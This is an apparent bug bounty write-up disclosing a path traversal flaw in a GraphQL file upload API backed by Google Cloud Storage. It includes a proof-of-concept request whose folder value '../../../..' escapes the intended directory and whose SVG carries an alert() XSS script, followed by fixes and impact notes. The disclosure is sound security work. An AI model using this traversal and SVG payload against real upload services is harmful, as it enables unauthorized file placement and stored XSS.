---
title: Path Traversal in File Upload via GraphQL API
description: A file upload endpoint accepted folder traversal sequences, enabling unauthorized file placement and abuse of signed Google Cloud Storage URLs.
date: 2025-03-11
tags:
  - path-traversal
  - file-upload
  - graphql
  - gcp
  - bug-bounty
---

# Path Traversal in File Upload via GraphQL API


## Summary

During a routine test of a GraphQL file upload API, I discovered a **path traversal vulnerability** that allowed attackers to escape intended directories and store files in arbitrary locations on Google Cloud Storage. This could lead to **malicious file hosting**, **stored XSS**, or **unintentional overwriting of sensitive files**.

---

## Vulnerability Details

- **Endpoint**: `POST /graphql`
- **Vulnerable Parameter**: `folder` inside the GraphQL mutation

By setting the `folder` variable to a traversal string like `../../../..`, I was able to manipulate the final storage path of the uploaded file.

---

## Proof of Concept

Here’s a condensed version of the PoC used in the request:

```http
POST /graphql HTTP/2
Host: rise-api.target.com
Authorization: Bearer <token>
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="operations"

{
  "operationName": "singleUpload",
  "variables": {
    "folder": "../../../..",
    "file": "newfile"
  },
  "query": "mutation singleUpload($file: Upload!, $folder: String!) { singleUpload(file: $file, folder: $folder) { filename uri signedUrl } }"
}
------boundary
Content-Disposition: form-data; name="map"

{ "1": ["variables.file"] }
------boundary
Content-Disposition: form-data; name="1"; filename="test.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert("XSS by mora");</script>
</svg>
------boundary--

```

### API Response

```json
{
  "data": {
    "singleUpload": {
      "filename": "test.svg",
      "uri": "organization_abc/../../../others/unique-id-test.svg",
      "signedUrl": "https://rise-files.target.com/others/unique-id-test.svg?...",
    }
  }
}
```

This shows the file being placed in a directory (`/others/`) outside the intended `organization_abc` context.

---

## Recommended Fixes

1. **Sanitize folder input**: Reject traversal sequences like `../` in any upload path.
2. **Whitelist upload directories**: Only allow uploads to pre-approved subdirectories.
3. **Limit signed URL lifetimes**: Expire signed URLs quickly to reduce misuse.
4. **Validate upload metadata server-side**: Don't rely on client-provided `folder` paths blindly.
5. **Restrict public access to upload endpoints**: Tie storage and access to strong authZ/authN checks.

---

## Impact

* **Persistent Malicious File Hosting**: Attackers could upload malware or phishing content to a trusted domain.
* **Stored XSS Risk**: Malicious file names or SVG files might execute if reflected or embedded.
* **Overwrite Risk**: Without validation, uploads could overwrite essential `.js`, `.json`, or user-generated content.
* **Information Exposure**: If GCS directory listings are ever enabled, sensitive files may be accessible.

---

## Resolution

The issue was marked **Informative** due to limited security impact in this context. However, it highlights a common misconfiguration when using file upload APIs, especially with cloud storage services like GCS or S3.

---

## 📚 References

* [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
* [GCP Signed URLs Best Practices](https://cloud.google.com/storage/docs/access-control/signed-urls)

---

Thanks for reading!

```
```
